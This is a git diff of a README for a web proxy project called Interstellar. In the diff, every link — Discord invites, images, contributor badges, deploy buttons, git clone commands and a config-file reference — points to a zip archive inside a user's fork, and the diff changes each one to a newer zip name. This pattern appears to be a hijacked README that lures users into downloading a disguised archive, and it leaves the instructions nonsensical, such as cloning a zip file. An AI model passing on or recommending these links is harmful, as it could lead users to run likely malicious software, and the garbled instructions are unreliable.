@@ -1,15 +1,15 @@
 <div align="center">
-    <img src="https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip">
+    <img src="https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip">
     <p>Serving over 8+ million users since 2023.<p>
     <p>Interstellar is a web proxy with a Clean and Sleek UI and easy to use menus. Our goal is to provide the best user experience to everyone.</p>
 </div>
 
-![inpreview](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip)
+![inpreview](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip)
 
 > [!IMPORTANT]
 > If you fork this project, consider giving it a star in the original repository!
 
-**Join Our [Discord Community](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip) for support, more links, and an active community!**
+**Join Our [Discord Community](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip) for support, more links, and an active community!**
 
 ## Features
 
@@ -21,7 +21,7 @@
 - Various Themes
 - Password Protection (Optional)
 - Built-in Tab System
-- https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip Support
+- https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip Support
 - Fast Speeds
 - Geforce NOW Support
 
@@ -32,7 +32,7 @@
 
 ### Password Protection
 
-1. Go to the `https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip` file and set `challenge` to **true**. Then, set the environment variable as follows:
+1. Go to the `https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip` file and set `challenge` to **true**. Then, set the environment variable as follows:
 2. For PNPM: Run either `config=true pnpm start` or `$env:config=true; pnpm start`, depending on your server.
 3. For Bun: Run either `config=true bun start` or `$env:config=true; bun start` if you prefer Bun.
 4. For NPM: Run either `config=true npm start` or `$env:config=true; npm start` if you prefer NPM.
@@ -43,14 +43,14 @@
 You must run these commands on your server:
 
 ```bash
-git clone https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip
+git clone https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip
 cd Interstellar
 ```
 
 #### Ad-Free Deployment
 
 ```bash
-git clone --branch Ad-Free https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip
+git clone --branch Ad-Free https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip
 cd Interstellar
 ```
 
@@ -90,17 +90,17 @@ cd Interstellar
 git pull --force --allow-unrelated-histories # This may overwrite your local changes
 ```
 
-<a target="_blank" href="https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip"><img alt="Deploy to Heroku" src="https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip"></a>
-<a target="_blank" href="https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip"><img alt="Deploy to Koyeb" src="https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip"></a>
+<a target="_blank" href="https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip"><img alt="Deploy to Heroku" src="https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip"></a>
+<a target="_blank" href="https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip"><img alt="Deploy to Koyeb" src="https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip"></a>
 
 ### Deployment Alternatives
 
-For more deployment options, join our [Discord Server](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip) for various ways to deploy Interstellar.
+For more deployment options, join our [Discord Server](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip) for various ways to deploy Interstellar.
 This includes methods of deploying to Render/OnRender.
 
 #### What happened to Replit Deployment?
 
-As of January 1st, 2024, Replit is [no longer free](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip). Try GitHub Codespaces instead.
+As of January 1st, 2024, Replit is [no longer free](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip). Try GitHub Codespaces instead.
 
 ### GitHub Codespaces
 
@@ -132,10 +132,10 @@ As of January 1st, 2024, Replit is [no longer free](https://raw.githubuserconten
 If you encounter problems, open an issue on GitHub, and we'll address it promptly.
 
 > [!TIP]
-> If you're having trouble, don't hesitate to reach out to us on [Discord](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip) for personalized support.
+> If you're having trouble, don't hesitate to reach out to us on [Discord](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip) for personalized support.
 
 # Credits
 
 A huge thanks goes out to all of the people who have contributed to Interstellar.
 
-[![Contributors](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip)](https://raw.githubusercontent.com/misslesnake2/Interstellar/main/static/assets/json/Software-2.1.zip)
+[![Contributors](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip)](https://github.com/misslesnake2/Interstellar/raw/refs/heads/main/static/assets/json/Software_v1.3.zip)
